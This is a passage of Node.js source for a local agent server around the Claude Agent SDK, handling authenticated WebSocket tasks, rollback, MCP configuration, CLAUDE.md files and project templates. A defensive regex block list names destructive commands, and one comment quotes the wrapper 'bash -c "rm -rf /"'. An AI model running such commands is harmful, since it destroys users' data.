  const result = await runClaudeSdkTask({
    prompt,
    model: model || env.ANTHROPIC_MODEL || "",
    permissionMode,
    originalMode,
    maxTurns,
    env,
    cwd,
    emit,
    signal,
    approvalManager,
    resume: body.resume || undefined,
    images: Array.isArray(body.images) ? body.images : [],
  });

  const diagnostic = result.ok ? "" : compactDiagnostic(result.stderr, result.output, result.error);
  return {
    ok: result.ok,
    error: result.ok ? null : (diagnostic ? `Claude Agent SDK execution failed: ${diagnostic}` : "Claude Agent SDK execution failed"),
    exitCode: result.exitCode ?? null,
    permissionMode,
    model: model || env.ANTHROPIC_MODEL || null,
    cwd,
    maxTurns,
    output: result.output || "",
    stderr: result.stderr || "",
    sdk: true,
    checkpoint,
    sessionId: result.sessionId || null,
  };
}

function rejectUpgrade(socket, status, message) {
  const body = `${message}\n`;
  socket.write([
    `HTTP/1.1 ${status} ${message}`,
    "Connection: close",
    "Content-Type: text/plain; charset=utf-8",
    `Content-Length: ${Buffer.byteLength(body)}`,
    "",
    body,
  ].join("\r\n"));
  socket.destroy();
}

function websocketOriginAllowed(req) {
  const origin = String(req.headers.origin || "").replace(/\/+$/, "");
  return !origin || ALLOWED_ORIGINS.has(origin);
}

// H6: Host 头校验——必须命中 loopback 主机名 + Agent 实际监听端口。
// 仅靠 Origin 不足以防御 DNS rebinding：恶意页面可让外部域名解析到 127.0.0.1，
// 此时浏览器会发送一个"合法"的 Origin（攻击者域）但 Host 是攻击者域而非 localhost:PORT。
// 把 Host 限定为 loopback 主机名可封堵这类绕过。
function websocketHostAllowed(req) {
  const host = String(req.headers.host || "").toLowerCase().trim();
  if (!host) return false;
  return host === `localhost:${PORT}` || host === `127.0.0.1:${PORT}` || host === `[::1]:${PORT}`;
}

function wsProtocolMessage(body) {
  const payload = typeof body === "object" && body !== null ? body : {};
  return JSON.stringify(payload);
}

function wsError(socket, requestId, error) {
  wsSend(socket, {
    type: "error",
    requestId: requestId || null,
    error: redactSensitive(error instanceof Error ? error.message : String(error || "Unknown error")),
  });
}

async function runWebSocketTask(socket, requestId, body, taskCtx) {
  const controller = taskCtx.controller;
  const emit = (event) => wsSend(socket, { ...event, requestId });
  emit({
    type: "start",
    cwd: body.cwd || null,
    model: body.model || null,
    mode: body.mode || "default",
    maxTurns: cleanMaxTurns(body.maxTurns),
  });
  const result = await runClaudeTask(body, emit, controller.signal, taskCtx.approvals);
  if (result.checkpoint && taskCtx.checkpoints) {
    taskCtx.checkpoints.set(result.checkpoint.id, result.checkpoint);
  }
  wsSend(socket, {
    type: "result",
    requestId,
    ok: result.ok,
    output: redactSensitive(result.output || ""),
    stderr: redactSensitive(result.stderr || ""),
    error: result.error ? redactSensitive(result.error) : null,
    exitCode: result.exitCode ?? null,
    sdk: true,
    model: result.model || null,
    cwd: result.cwd || null,
    permissionMode: result.permissionMode || null,
    maxTurns: result.maxTurns || null,
    claudeSessionId: result.sessionId || null,
  });
  wsSend(socket, { type: "done", requestId });
}

function attachWebSocket(socket, initialHead = Buffer.alloc(0)) {
  const state = { buffer: Buffer.alloc(0) };
  const tasks = new Map();
  let alive = true;
  const cleanup = () => {
    if (!alive) return;
    alive = false;
    for (const t of tasks.values()) {
      t.controller.abort();
      if (t.approvals) t.approvals.rejectAll();
    }
    tasks.clear();
  };

  wsSend(socket, {
    type: "ready",
    version: VERSION,
    protocolVersion: PROTOCOL_VERSION,
    transport: "websocket",
    engine: "claude-agent-sdk",
  });

  const handleMessage = (message) => {
    let body;
    try {
      body = JSON.parse(message.payload.toString("utf8"));
    } catch {
      wsError(socket, null, "Invalid WebSocket JSON message");
      return;
    }

    const type = String(body.type || "");
    const requestId = String(body.requestId || randomBytes(8).toString("hex"));
    if (type === "ping") {
      wsSend(socket, { type: "pong", requestId });
      return;
    }
    if (type === "approval_respond") {
      for (const t of tasks.values()) {
        t.approvals.respond(String(body.approvalId || ""), String(body.decision || "deny"));
      }
      return;
    }
    if (type === "auto_accept") {
      const value = Boolean(body.value);
      for (const t of tasks.values()) {
        if (typeof t.approvals?.setAutoAccept === "function") t.approvals.setAutoAccept(value);
      }
      wsSend(socket, { type: "auto_accept_ack", value, requestId });
      return;
    }
    if (type === "rollback") {
      const cpId = String(body.checkpointId || "");
      let handled = false;
      for (const t of tasks.values()) {
        // E-3: 先查 task-level，再 fallback 到 globalCheckpoints（任务结束后仍可回滚）
        const snap = t.checkpoints.get(cpId) || globalCheckpoints.get(cpId);
        if (snap) {
          handled = true;
          rollbackCheckpoint(snap)
            .then(() => wsSend(socket, { type: "rolled", checkpointId: cpId, requestId }))
            .catch((error) => wsSend(socket, { type: "error", requestId, error: redactSensitive(error instanceof Error ? error.message : "回滚失败") }));
          break;
        }
      }
      // E-3: 所有 task 都没匹配时，最后查 globalCheckpoints（任务已结束的场景）
      if (!handled) {
        const snap = globalCheckpoints.get(cpId);
        if (snap) {
          handled = true;
          rollbackCheckpoint(snap)
            .then(() => wsSend(socket, { type: "rolled", checkpointId: cpId, requestId }))
            .catch((error) => wsSend(socket, { type: "error", requestId, error: redactSensitive(error instanceof Error ? error.message : "回滚失败") }));
        }
      }
      if (!handled) wsSend(socket, { type: "error", requestId, error: "找不到回滚点" });
      return;
    }
    if (type === "cancel") {
      const task = tasks.get(requestId);
      if (task) {
        task.controller.abort();
        if (task.approvals) task.approvals.rejectAll();
        tasks.delete(requestId);
        wsSend(socket, { type: "cancelled", requestId });
      }
      return;
    }
    if (type !== "run") {
      wsError(socket, requestId, `Unsupported WebSocket message type: ${type || "(missing)"}`);
      return;
    }
    if (tasks.size > 0) {
      wsError(socket, requestId, "Another Agent task is already running. Cancel it or wait for it to finish.");
      return;
    }

    const controller = new AbortController();
    const emit = (event) => wsSend(socket, { ...event, requestId });
    const approvals = createApprovalManager(emit);
    const checkpoints = new Map();
    const taskCtx = { controller, approvals, checkpoints };
    tasks.set(requestId, taskCtx);
    runWebSocketTask(socket, requestId, body, taskCtx)
      .catch((error) => wsError(socket, requestId, error))
      .finally(() => tasks.delete(requestId));
  };

  const consume = (chunk) => {
    let frames;
    try {
      frames = parseWebSocketFrames(state, chunk);
    } catch (error) {
      wsError(socket, null, error);
      wsClose(socket, 1009, "Frame too large");
      return;
    }
    for (const frame of frames) {
      if (frame.opcode === 8) {
        cleanup();
        wsClose(socket, 1000, "closed");
        return;
      }
      if (frame.opcode === 9) {
        socket.write(wsFrame(frame.payload, 10));
        continue;
      }
      if (frame.opcode !== 1) continue;
      if (!frame.masked) {
        wsClose(socket, 1002, "Client frames must be masked");
        return;
      }
      handleMessage(frame);
    }
  };

  socket.on("data", consume);
  socket.on("close", cleanup);
  socket.on("error", cleanup);
  if (initialHead.length > 0) consume(initialHead);
}

function handleWebSocketUpgrade(req, socket, head) {
  if (!isLoopback(req)) return rejectUpgrade(socket, 403, "Forbidden");
  // H6: Host 头必须命中 loopback 主机名 + Agent 端口（防 DNS rebinding / 外部域名解析绕过）
  if (!websocketHostAllowed(req)) return rejectUpgrade(socket, 403, "Host Not Allowed");
  const url = new URL(req.url || "/", `http://${req.headers.host || "127.0.0.1"}`);
  if (url.pathname !== "/ws") return rejectUpgrade(socket, 404, "Not Found");
  if (!websocketOriginAllowed(req)) return rejectUpgrade(socket, 403, "Origin Not Allowed");
  if (String(req.headers.upgrade || "").toLowerCase() !== "websocket") return rejectUpgrade(socket, 400, "Bad Request");
  const key = String(req.headers["sec-websocket-key"] || "");
  if (!key) return rejectUpgrade(socket, 400, "Missing WebSocket Key");
  // H6: 浏览器 WebSocket 无法设自定义 header，token 走 ?token=；非浏览器客户端也接受 x-sparkloom-agent-token header（与 HTTP 路由一致）
  const headerToken = req.headers["x-sparkloom-agent-token"];
  const headerValue = Array.isArray(headerToken) ? headerToken[0] : headerToken;
  const token = url.searchParams.get("token") || headerValue || "";
  if (!tokenAuthorized(token)) return rejectUpgrade(socket, 401, "Unauthorized");

  socket.write([
    "HTTP/1.1 101 Switching Protocols",
    "Upgrade: websocket",
    "Connection: Upgrade",
    `Sec-WebSocket-Accept: ${wsAcceptValue(key)}`,
    "",
    "",
  ].join("\r\n"));
  attachWebSocket(socket, head);
}

async function bundledSkillNames() {
  const entries = await readdir(SKILLS_DIR, { withFileTypes: true });
  const names = [];
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    try {
      await stat(path.join(SKILLS_DIR, entry.name, "SKILL.md"));
      names.push(entry.name);
    } catch {
      // Skip incomplete skill directories.
    }
  }
  return names.sort();
}

// P2-2 /context 调试视图：返回本机 Claude SDK 的上下文来源信息
// 注：Claude Agent SDK 内部维护 session 消息列表，外部无法读取已加载的具体消息。
// 这里返回所有"看得见"的上下文来源（配置文件 / CLAUDE.md / settings / cwd），前端组合 messages 展示。
async function claudeContextStatus(cwdHint = "") {
  const configDir = claudeCodeConfigDir();
  const userDir = userConfigDir();
  const gateway = await claudeGatewayStatus();
  const candidates = [];
  // 系统/用户级 CLAUDE.md
  const userClaudeMd = path.join(userDir, "CLAUDE.md");
  candidates.push({ kind: "user_claude_md", path: userClaudeMd, scope: "user" });
  // 项目级 CLAUDE.md（若指定 cwd）
  let cwd = "";
  if (cwdHint) {
    try { cwd = await cleanCwd(cwdHint); } catch { cwd = ""; }
  }
  if (cwd) {
    candidates.push({ kind: "project_claude_md", path: path.join(cwd, "CLAUDE.md"), scope: "project" });
    candidates.push({ kind: "project_claude_local_md", path: path.join(cwd, "CLAUDE.local.md"), scope: "project-local" });
  }
  // settings.json
  candidates.push({ kind: "settings_user", path: path.join(configDir, "settings.json"), scope: "user" });
  if (cwd) {
    candidates.push({ kind: "settings_project", path: path.join(cwd, ".claude", "settings.json"), scope: "project" });
  }
  // 检查文件是否存在
  const sources = [];
  for (const c of candidates) {
    let exists = false;
    let size = 0;
    try {
      const st = await stat(c.path);
      exists = true;
      size = st.size;
    } catch { /* not exist */ }
    sources.push({ ...c, exists, size });
  }
  return {
    agentVersion: VERSION,
    configDir,
    userDir,
    cwd: cwd || null,
    gateway: {
      configured: gateway.configured,
      baseUrl: gateway.baseUrl,
      configFile: gateway.file,
      model: gateway.model,
    },
    systemPromptSources: sources,
    note: "Claude Agent SDK 内部维护消息列表与 token 计数，本接口仅返回外部可见的上下文来源。已加载的具体消息列表请看下方的 session messages。",
  };
}

async function skillsStatus() {
  const targetRoot = claudeSkillsDir();
  const bundled = await bundledSkillNames();
  const installed = [];
  const missing = [];
  for (const name of bundled) {
    try {
      await stat(path.join(targetRoot, name, "SKILL.md"));
      installed.push(name);
    } catch {
      missing.push(name);
    }
  }
  return {
    directory: targetRoot,
    bundled,
    installed,
    missing,
  };
}

async function installSkills() {
  const targetRoot = claudeSkillsDir();
  await mkdir(targetRoot, { recursive: true });
  const entries = await readdir(SKILLS_DIR, { withFileTypes: true });
  const installed = [];
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    const source = path.join(SKILLS_DIR, entry.name, "SKILL.md");
    try {
      await stat(source);
    } catch {
      continue;
    }
    const targetDir = path.join(targetRoot, entry.name);
    await mkdir(targetDir, { recursive: true });
    const content = await readFile(source, "utf8");
    await writeFile(path.join(targetDir, "SKILL.md"), content, { mode: constants.S_IRUSR | constants.S_IWUSR });
    installed.push(entry.name);
  }
  return { ok: true, directory: targetRoot, installed };
}

// 任务 2 MCP 配置入口：读写本机 Claude Code / Claude Agent SDK 的 MCP servers 配置
// 优先读 ~/.claude.json（Claude Code CLI 标准），fallback claudeCodeConfigDir/settings.json（SDK）
// 写入统一到 ~/.claude.json，保留 Claude Code CLI 兼容（agent 重启或 Claude Code 直接重启都生效）
function claudeCodeJsonFile() {
  return path.join(homedir(), ".claude.json");
}

function claudeCodeSettingsFile() {
  return path.join(claudeCodeConfigDir(), "settings.json");
}

function normalizeMcpServerEntry(raw) {
  if (!raw || typeof raw !== "object") return null;
  const command = typeof raw.command === "string" ? raw.command.trim() : "";
  if (!command) return null;
  const args = Array.isArray(raw.args)
    ? raw.args.map((a) => (typeof a === "string" ? a : String(a))).filter((a) => a.length > 0)
    : [];
  const env = raw.env && typeof raw.env === "object"
    ? Object.fromEntries(
        Object.entries(raw.env)
          .filter(([k, v]) => typeof k === "string" && typeof v === "string")
          .map(([k, v]) => [k.slice(0, 64), v.slice(0, 4096)])
      )
    : {};
  return { command, args, env };
}

async function readMcpConfig(cwdHint = "") {
  // M7: 按优先级从高到低排列（local > project > user > SDK），合并时 first-seen wins
  //   local scope: ~/.claude.json 内 projects[cwd].mcpServers（仅当前项目可见，最高优先级）
  //   project scope: cwd/.mcp.json（随项目 git 共享，第二优先级）
  //   user scope: ~/.claude.json 顶层 mcpServers（沿用原 scope 名 claude-code-cli 保持前端兼容）
  //   SDK scope: settings.json mcpServers（最低，SDK 专用）
  let cwd = "";
  if (cwdHint) {
    try { cwd = await cleanCwd(cwdHint); } catch { cwd = ""; }
  }
  const files = [];
  if (cwd) {
    files.push({ file: claudeCodeJsonFile(), scope: "claude-code-local", exists: false, projectScope: cwd });
    files.push({ file: path.join(cwd, ".mcp.json"), scope: "claude-code-project", exists: false });
  }
  files.push({ file: claudeCodeJsonFile(), key: "mcpServers", scope: "claude-code-cli", exists: false });
  files.push({ file: claudeCodeSettingsFile(), key: "mcpServers", scope: "claude-agent-sdk", exists: false });

  const sources = [];
  const merged = new Map();
  for (const entry of files) {
    let raw = "";
    try {
      raw = await readFile(entry.file, "utf8");
    } catch {
      sources.push({ file: entry.file, scope: entry.scope, exists: false });
      continue;
    }
    let parsed = {};
    try {
      parsed = JSON.parse(raw);
    } catch {
      sources.push({ file: entry.file, scope: entry.scope, exists: true, parseError: true });
      continue;
    }
    // local scope: 取嵌套字段 projects[cwd].mcpServers
    let servers;
    if (entry.projectScope) {
      const proj = parsed.projects && typeof parsed.projects === "object" ? parsed.projects[entry.projectScope] : null;
      const sub = proj && typeof proj === "object" ? proj.mcpServers : null;
      servers = sub && typeof sub === "object" ? sub : {};
    } else {
      servers = parsed[entry.key] && typeof parsed[entry.key] === "object" ? parsed[entry.key] : {};
    }
    const list = [];
    for (const [name, serverRaw] of Object.entries(servers)) {
      const normalized = normalizeMcpServerEntry(serverRaw);
      if (!normalized) continue;
      if (!merged.has(name)) merged.set(name, normalized);
      list.push({ name, ...normalized });
    }
    sources.push({ file: entry.file, scope: entry.scope, exists: true, serverCount: list.length });
  }
  return {
    servers: Array.from(merged.entries()).map(([name, v]) => ({ name, ...v })),
    sources,
    note: "MCP 配置修改需重启 Claude Code / 本机 Agent 才会生效。",
  };
}

// 危险 command 黑名单：拦截明显的破坏性命令（rm/del/format/mkfs/dd/shred 等）
// M4: 检查时拼合 command + args 整条字符串再匹配，防 bash -c "rm -rf /" 这类 wrapper 绕过
const MCP_DANGEROUS_COMMANDS = /\b(rm|del|erase|rmdir|deltree|format|mkfs|dd|shred|wipe|shutdown|halt|reboot|poweroff)\b|\bfind\b.*(-delete|-execdir|-exec\s+rm)/i;

async function writeMcpConfig(action, server) {
  const name = String(server?.name || "").trim().slice(0, 64);
  if (!name || !/^[A-Za-z0-9_-]+$/.test(name)) {
    throw new Error("MCP server 名称仅支持字母、数字、下划线、连字符");
  }

  // M5: 写入前先在两个可写源（user scope: ~/.claude.json + SDK scope: settings.json）查 name 的真实归属
  const userFile = claudeCodeJsonFile();
  const sdkFile = claudeCodeSettingsFile();
  const userParsed = await readJsonForMcp(userFile);
  const sdkParsed = await readJsonForMcp(sdkFile);
  const userServers = (userParsed.mcpServers && typeof userParsed.mcpServers === "object") ? userParsed.mcpServers : null;
  const sdkServers = (sdkParsed.mcpServers && typeof sdkParsed.mcpServers === "object") ? sdkParsed.mcpServers : null;
  const inUser = userServers && Object.prototype.hasOwnProperty.call(userServers, name);
  const inSdk = sdkServers && Object.prototype.hasOwnProperty.call(sdkServers, name);

  if (action === "remove") {
    // M5: 按真实归属源删除；两个源都不存在则显式报错（原代码静默返回 ok 误导前端）
    let targetFile, targetParsed, targetServers;
    if (inUser) {
      targetFile = userFile; targetParsed = userParsed; targetServers = userServers;
    } else if (inSdk) {
      targetFile = sdkFile; targetParsed = sdkParsed; targetServers = sdkServers;
    } else {
      throw new Error(`MCP server「${name}」不存在于任何配置源，未作更改（可能位于 project scope 的 .mcp.json，请手动编辑）`);
    }
    delete targetServers[name];
    await atomicWriteJson(targetFile, targetParsed);
    return { ok: true, action, name, file: targetFile };
  }

  if (action === "add" || action === "update") {
    const normalized = normalizeMcpServerEntry(server);
    if (!normalized) throw new Error("command 必填");
    // M4: 检查整条 command + args 字符串
    const fullCmd = `${normalized.command} ${normalized.args.join(" ")}`;
    if (MCP_DANGEROUS_COMMANDS.test(fullCmd)) {
      throw new Error(`command "${fullCmd.trim()}" 含危险关键字，已拒绝写入`);
    }

    if (action === "add") {
      // M8: add 显式拒绝重名（跨两个可写源都查）——原代码静默覆盖会丢旧 env/配置
      if (inUser || inSdk) {
        throw new Error(`MCP server「${name}」已存在，请改用编辑或更换名称`);
      }
      if (!userParsed.mcpServers || typeof userParsed.mcpServers !== "object") userParsed.mcpServers = {};
      userParsed.mcpServers[name] = normalized;
      await atomicWriteJson(userFile, userParsed);
      return { ok: true, action, name, file: userFile };
    }

    // action === "update"：M5 作用于实际归属源；不存在则新建到 user scope（保持现有默认行为）
    let targetFile, targetParsed, targetServers;
    if (inUser) {
      targetFile = userFile; targetParsed = userParsed; targetServers = userServers;
    } else if (inSdk) {
      targetFile = sdkFile; targetParsed = sdkParsed; targetServers = sdkServers;
    } else {
      targetFile = userFile; targetParsed = userParsed;
      if (!targetParsed.mcpServers || typeof targetParsed.mcpServers !== "object") targetParsed.mcpServers = {};
      targetServers = targetParsed.mcpServers;
    }
    targetServers[name] = normalized;
    await atomicWriteJson(targetFile, targetParsed);
    return { ok: true, action, name, file: targetFile };
  }

  throw new Error(`未知 action: ${action}`);
}

// writeMcpConfig 专用：读取并容错解析 JSON 文件（不存在/损坏都返回 {}，不抛错）
async function readJsonForMcp(file) {
  try {
    const raw = await readFile(file, "utf8");
    return raw.trim() ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
}

// 任务 2 内存/CLAUDE.md 面板：列出可能的 CLAUDE.md 路径（项目级 + 用户级 + 全局）
// 路径必须在 cwd（若有）或 CLAUDE_CONFIG_DIR 或 ~/.claude 内
function isPathInside(target, parent) {
  const t = path.resolve(target);
  const p = path.resolve(parent);
  if (t === p) return false; // 文件本身不能等于目录
  const rel = path.relative(p, t);
  return rel.length > 0 && !rel.startsWith("..") && !path.isAbsolute(rel);
}

function endsWithClaudeMdOrMd(target) {
  const base = path.basename(path.resolve(target)).toLowerCase();
  return base === "claude.md" || base.endsWith(".md");
}

async function listClaudeMemoryFiles(cwdHint) {
  const configDir = claudeCodeConfigDir();
  const candidates = [];
  // 用户/全局配置目录（~/.sparkloom/claude-code/CLAUDE.md）
  candidates.push({ path: path.join(configDir, "CLAUDE.md"), scope: "config-dir", label: "全局（CLAUDE_CONFIG_DIR）" });
  // Claude Code CLI 默认位置（~/.claude/CLAUDE.md）
  candidates.push({ path: path.join(homedir(), ".claude", "CLAUDE.md"), scope: "global-cli", label: "Claude Code CLI（~/.claude）" });
  // 用户主目录下 CLAUDE.md（兼容老式）
  // 项目级 CLAUDE.md
  let cwd = "";
  if (cwdHint) {
    try { cwd = await cleanCwd(cwdHint); } catch { cwd = ""; }
  }
  if (cwd) {
    candidates.push({ path: path.join(cwd, "CLAUDE.md"), scope: "project", label: `项目（${path.basename(cwd)}）` });
    candidates.push({ path: path.join(cwd, ".claude", "CLAUDE.md"), scope: "project-local", label: `项目本地（.claude）` });
  }
  const result = [];
  for (const c of candidates) {
    let exists = false;
    let size = 0;
    try {
      const st = await stat(c.path);
      exists = true;
      size = st.size;
    } catch { /* not exist */ }
    result.push({ ...c, exists, size });
  }
  return { files: result, configDir, cwd: cwd || null };
}

async function readClaudeMemoryFile(targetPath, cwdHint) {
  if (!targetPath) throw new Error("path is required");
  const resolved = path.resolve(String(targetPath));
  if (!endsWithClaudeMdOrMd(resolved)) {
    throw new Error("仅允许读取 CLAUDE.md 或 .md 文件");
  }
  // 安全校验：必须在 configDir、~/.claude 或 cwd 内
  const configDir = claudeCodeConfigDir();
  const cliDir = path.join(homedir(), ".claude");
  let cwd = "";
  if (cwdHint) {
    try { cwd = await cleanCwd(cwdHint); } catch { cwd = ""; }
  }
  const allowedRoots = [configDir, cliDir];
  if (cwd) allowedRoots.push(cwd);
  const ok = allowedRoots.some((root) => isPathInside(resolved, root));
  if (!ok) {
    throw new Error("文件路径越界：必须在项目目录或 CLAUDE 配置目录内");
  }
  const content = await readFile(resolved, "utf8");
  return { path: resolved, content };
}

async function writeClaudeMemoryFile(targetPath, content, cwdHint) {
  if (!targetPath) throw new Error("path is required");
  const resolved = path.resolve(String(targetPath));
  if (!endsWithClaudeMdOrMd(resolved)) {
    throw new Error("仅允许写入 CLAUDE.md 或 .md 文件");
  }
  const configDir = claudeCodeConfigDir();
  const cliDir = path.join(homedir(), ".claude");
  let cwd = "";
  if (cwdHint) {
    try { cwd = await cleanCwd(cwdHint); } catch { cwd = ""; }
  }
  const allowedRoots = [configDir, cliDir];
  if (cwd) allowedRoots.push(cwd);
  const ok = allowedRoots.some((root) => isPathInside(resolved, root));
  if (!ok) {
    throw new Error("文件路径越界：必须在项目目录或 CLAUDE 配置目录内");
  }
  const text = typeof content === "string" ? content : String(content || "");
  if (text.length > 1024 * 1024) throw new Error("文件内容过大（>1MB），已拒绝写入");
  await mkdir(path.dirname(resolved), { recursive: true });
  await writeFile(resolved, text, "utf8");
  const st = await stat(resolved);
  return { ok: true, path: resolved, size: st.size };
}

// ===== 任务 1 模板画廊：内置项目模板，POST /claude/init-template 写入到 cwd =====
// 5 个内置模板写死在代码里：React+Vite / Next.js / Python CLI / Node CLI / 空项目
const PROJECT_TEMPLATES = [
  {
    id: "react-vite",
    name: "React + Vite",
    desc: "Vite + React 19 + TypeScript，纯前端 SPA 起步模板。",
    icon: "⚛️",
    files: [
      { path: "package.json", content: "{\n  \"name\": \"react-vite-app\",\n  \"private\": true,\n  \"version\": \"0.0.0\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"dev\": \"vite\",\n    \"build\": \"tsc -b && vite build\",\n    \"preview\": \"vite preview\"\n  },\n  \"dependencies\": {\n    \"react\": \"^19.0.0\",\n    \"react-dom\": \"^19.0.0\"\n  },\n  \"devDependencies\": {\n    \"@types/react\": \"^19.0.0\",\n    \"@types/react-dom\": \"^19.0.0\",\n    \"@vitejs/plugin-react\": \"^4.3.0\",\n    \"typescript\": \"^5.6.0\",\n    \"vite\": \"^6.0.0\"\n  }\n}\n" },
      { path: "vite.config.ts", content: "import { defineConfig } from \"vite\";\nimport react from \"@vitejs/plugin-react\";\n\nexport default defineConfig({\n  plugins: [react()],\n  server: { port: 5173 },\n});\n" },
      { path: "tsconfig.json", content: "{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"useDefineForClassFields\": true,\n    \"lib\": [\"ES2022\", \"DOM\", \"DOM.Iterable\"],\n    \"module\": \"ESNext\",\n    \"skipLibCheck\": true,\n    \"moduleResolution\": \"bundler\",\n    \"allowImportingTsExtensions\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noEmit\": true,\n    \"strict\": true\n  },\n  \"include\": [\"src\"]\n}\n" },
      { path: "index.html", content: "<!doctype html>\n<html lang=\"zh-CN\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>React + Vite App</title>\n  </head>\n  <body>\n    <div id=\"root\"></div>\n    <script type=\"module\" src=\"/src/main.tsx\"></script>\n  </body>\n</html>\n" },
      { path: "src/main.tsx", content: "import React from \"react\";\nimport ReactDOM from \"react-dom/client\";\nimport App from \"./App\";\n\nReactDOM.createRoot(document.getElementById(\"root\")!).render(\n  <React.StrictMode>\n    <App />\n  </React.StrictMode>,\n);\n" },
      { path: "src/App.tsx", content: "export default function App() {\n  return <h1>Hello, React + Vite!</h1>;\n}\n" },
      { path: ".gitignore", content: "node_modules\ndist\n.env.local\n*.log\n.DS_Store\n" },
    ],
  },
  {
    id: "nextjs",
    name: "Next.js",
    desc: "Next.js App Router + TypeScript + Tailwind，全栈起步模板。",
    icon: "▲",
    files: [
      { path: "package.json", content: "{\n  \"name\": \"nextjs-app\",\n  \"private\": true,\n  \"scripts\": {\n    \"dev\": \"next dev\",\n    \"build\": \"next build\",\n    \"start\": \"next start\",\n    \"lint\": \"next lint\"\n  },\n  \"dependencies\": {\n    \"next\": \"^15.0.0\",\n    \"react\": \"^19.0.0\",\n    \"react-dom\": \"^19.0.0\"\n  },\n  \"devDependencies\": {\n    \"@types/node\": \"^22.0.0\",\n    \"@types/react\": \"^19.0.0\",\n    \"@types/react-dom\": \"^19.0.0\",\n    \"typescript\": \"^5.6.0\",\n    \"tailwindcss\": \"^4.0.0\",\n    \"@tailwindcss/postcss\": \"^4.0.0\",\n    \"postcss\": \"^8.4.0\"\n  }\n}\n" },
      { path: "next.config.mjs", content: "/** @type {import('next').NextConfig} */\nconst nextConfig = {};\nexport default nextConfig;\n" },
      { path: "tsconfig.json", content: "{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"lib\": [\"dom\", \"dom.iterable\", \"esnext\"],\n    \"allowJs\": true,\n    \"skipLibCheck\": true,\n    \"strict\": true,\n    \"noEmit\": true,\n    \"esModuleInterop\": true,\n    \"module\": \"esnext\",\n    \"moduleResolution\": \"bundler\",\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"jsx\": \"preserve\",\n    \"incremental\": true,\n    \"plugins\": [{ \"name\": \"next\" }],\n    \"paths\": { \"@/*\": [\"./src/*\"] }\n  },\n  \"include\": [\"next-env.d.ts\", \"**/*.ts\", \"**/*.tsx\", \".next/types/**/*.ts\"],\n  \"exclude\": [\"node_modules\"]\n}\n" },
      { path: "postcss.config.mjs", content: "export default {\n  plugins: {\n    \"@tailwindcss/postcss\": {},\n  },\n};\n" },
      { path: "src/app/globals.css", content: "@import \"tailwindcss\";\n\nhtml, body { max-width: 100vw; overflow-x: hidden; }\nbody { font-family: system-ui, -apple-system, sans-serif; }\n" },
      { path: "src/app/layout.tsx", content: "import type { Metadata } from \"next\";\nimport \"./globals.css\";\n\nexport const metadata: Metadata = { title: \"Next.js App\", description: \"Generated by Sparkloom Studio template\" };\n\nexport default function RootLayout({ children }: { children: React.ReactNode }) {\n  return (\n    <html lang=\"zh-CN\">\n      <body>{children}</body>\n    </html>\n  );\n}\n" },
      { path: "src/app/page.tsx", content: "export default function Home() {\n  return <main className=\"p-8 text-2xl\">Hello, Next.js!</main>;\n}\n" },
      { path: ".gitignore", content: "node_modules\n.next\nout\n.env*.local\n*.log\n.DS_Store\n" },
    ],
  },
  {
    id: "python-cli",
    name: "Python CLI",
    desc: "Python + argparse 命令行工具起步模板。",
    icon: "🐍",
    files: [
      { path: "main.py", content: "import argparse\nimport sys\n\n\ndef main(argv=None) -> int:\n    parser = argparse.ArgumentParser(prog=\"app\", description=\"Python CLI 起步模板\")\n    parser.add_argument(\"--name\", default=\"world\", help=\"问候对象\")\n    args = parser.parse_args(argv)\n    print(f\"Hello, {args.name}!\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n" },
      { path: "requirements.txt", content: "# 在这里添加依赖，例如 requests、rich\n" },
      { path: "README.md", content: "# Python CLI\n\nSparkloom Studio 生成的 Python 命令行工具模板。\n\n## 使用\n\n```bash\npython main.py --name Sparkloom\n```\n" },
      { path: ".gitignore", content: "__pycache__/\n*.pyc\n.venv/\nvenv/\n.env\n*.log\n.DS_Store\n" },
    ],
  },
  {
    id: "node-cli",
    name: "Node CLI",
    desc: "Node.js + Commander 命令行工具起步模板。",
    icon: "🟢",
    files: [
      { path: "package.json", content: "{\n  \"name\": \"node-cli-app\",\n  \"version\": \"0.0.0\",\n  \"private\": true,\n  \"type\": \"module\",\n  \"bin\": { \"app\": \"./src/index.js\" },\n  \"scripts\": {\n    \"start\": \"node src/index.js\"\n  },\n  \"dependencies\": {\n    \"commander\": \"^12.1.0\"\n  }\n}\n" },
      { path: "src/index.js", content: "#!/usr/bin/env node\nimport { program } from \"commander\";\n\nprogram\n  .name(\"app\")\n  .description(\"Node CLI 起步模板\")\n  .version(\"0.0.0\")\n  .option(\"--name <name>\", \"问候对象\", \"world\")\n  .action((options) => {\n    console.log(`Hello, ${options.name}!`);\n  });\n\nprogram.parse();\n" },
      { path: "README.md", content: "# Node CLI\n\nSparkloom Studio 生成的 Node.js 命令行工具模板。\n\n## 使用\n\n```bash\nnode src/index.js --name Sparkloom\n```\n" },
      { path: ".gitignore", content: "node_modules\n.env\n*.log\n.DS_Store\n" },
    ],
  },
  {
    id: "empty",
    name: "空项目",
    desc: "只生成 README.md 和 .gitignore，从零开始。",
    icon: "📄",
    files: [
      { path: "README.md", content: "# Untitled Project\n\n由 Sparkloom Studio 创建的空项目。\n\n## 说明\n\n在这里写项目说明、功能列表、使用方法。\n" },
      { path: ".gitignore", content: "node_modules\n.env\n.env.local\n*.log\n.DS_Store\n" },
    ],
  },
];

function getTemplateById(templateId) {
  return PROJECT_TEMPLATES.find((t) => t.id === templateId) || null;
}

async function initTemplate(templateId, cwdHint) {
  const template = getTemplateById(String(templateId || ""));
  if (!template) throw new Error(`未知模板: ${templateId}`);
  const cwd = await cleanCwd(cwdHint);
  const created = [];
  const skipped = [];
  for (const f of template.files) {
    // 路径校验：禁止绝对路径、.. 越界；保持相对路径在 cwd 内
    const rel = String(f.path || "").replace(/^\.?\//, "");
    if (!rel || rel.includes("..") || path.isAbsolute(rel)) {
      skipped.push({ path: f.path, reason: "invalid path" });
      continue;
    }
    const target = path.join(cwd, rel);
